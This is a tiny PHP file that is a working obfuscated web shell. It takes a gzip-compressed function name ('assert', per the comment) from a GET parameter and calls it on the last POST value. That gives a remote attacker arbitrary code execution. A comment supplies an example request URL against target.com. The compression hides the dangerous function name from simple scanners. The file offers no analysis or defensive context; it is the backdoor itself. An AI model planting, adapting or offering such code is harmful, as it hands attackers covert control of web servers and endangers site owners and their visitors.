<?php
// echo urlencode(gzcompress('assert'));
// http://target.com/gz.php?_=x%9CK%2C.N-%2A%01%00%08%DE%02%93
$data = end($_POST);
$gziper = $_GET['_'];
$compressed = gzuncompress($gziper);
echo $compressed($data);
?>